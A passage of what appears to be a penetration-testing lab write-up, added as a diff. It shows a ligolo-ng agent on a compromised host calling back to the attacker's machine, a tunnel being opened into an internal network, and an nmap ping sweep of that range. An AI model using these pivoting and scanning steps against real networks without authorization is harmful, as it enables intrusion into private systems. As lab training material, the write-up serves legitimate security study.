@@ -133,3 +133,36 @@ privilege@ubuntu-virtual-machine:~$ sudo ./agent -connect 10.10.200.206:443 -ign
 WARN[0000] warning, certificate validation disabled     
 INFO[0000] Connection established                        addr="10.10.200.206:443" 
 ```
+
+Our serverside attacking machine shows the connection:
+```bash
+igolo-ng » INFO[0632] Agent joined.                                 name=root@ubuntu-virtual-machine remote="192.168.80.10:36306"
+ligolo-ng » session
+? Specify a session :  [Use arrows to move, type to filter]
+> 1 - root@ubuntu-virtual-machine - 192.168.80.10:36306
+
+```
+
+With this setup done, we can start up a tunnal and reach our new internal host from our attacking machine:
+```bash
+[Agent : root@ubuntu-virtual-machine] » start
+[Agent : root@ubuntu-virtual-machine] » INFO[1188] Starting tunnel to root@ubuntu-virtual-machine 
+```
+
+# Enumeration
+We will start with a basic enumeration through our internal range
+
+```bash
+┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
+└──╼ $nmap -sn 192.168.98.0/24
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 20:14 EST
+Nmap scan report for 192.168.98.2
+Host is up (0.61s latency).
+Nmap scan report for 192.168.98.15
+Host is up (0.19s latency).
+Nmap scan report for 192.168.98.30
+Host is up (0.22s latency).
+Nmap scan report for 192.168.98.120
+Host is up (0.36s latency).
+Nmap done: 256 IP addresses (4 hosts up) scanned in 27.04 seconds
+```
